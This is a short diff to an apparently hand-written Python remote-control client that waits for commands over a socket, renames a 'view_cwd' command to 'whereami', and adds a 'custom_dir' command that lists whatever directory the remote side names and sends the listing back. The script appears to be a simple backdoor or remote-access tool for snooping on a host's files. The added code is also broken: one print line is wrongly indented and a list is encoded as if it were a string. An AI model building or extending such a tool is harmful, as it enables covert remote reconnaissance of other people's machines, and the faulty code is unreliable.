@@ -22,11 +22,21 @@ while 1:
     command = command.decode()
     print("Command received")
     print("")
-    if command == "view_cwd":
+    if command == "whereami":
         files = os.getcwd()
         files = str(files)
         s.send(files.encode())
         print("Command executed..")
+
+    elif command == "custom_dir":
+        user_input = s.recv(5000)
+        user_input = user_input.decode()
+        files = os.listdir(user_input)
+
+        s.send(files.encode())
+        print("")
+            print("Command has been 3XECUT3D succesfully")
+
 
     else:
         print("")
